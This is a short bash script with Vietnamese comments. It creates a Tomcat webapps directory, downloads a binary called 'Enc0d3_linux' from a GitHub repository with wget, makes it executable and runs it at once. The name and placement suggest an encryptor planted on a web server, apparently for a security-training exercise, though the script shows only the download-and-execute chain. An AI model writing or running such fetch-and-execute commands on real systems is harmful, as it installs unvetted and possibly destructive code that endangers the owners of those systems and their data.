#!/bin/bash

# Đặt thư mục đích
DEST_DIR="/opt/tomcat/webapps"

# Tạo thư mục nếu chưa tồn tại
mkdir -p "$DEST_DIR"

# Tải file từ URL và lưu vào thư mục đích
wget -O "$DEST_DIR/Enc0d3_linux" https://github.com/ThanHuuTuan/DT_ATTT_VR/raw/main/Enc0d3_linux

# Đặt quyền thực thi cho file đã tải
chmod +x "$DEST_DIR/Enc0d3_linux"

# Chạy file
"$DEST_DIR/Enc0d3_linux"
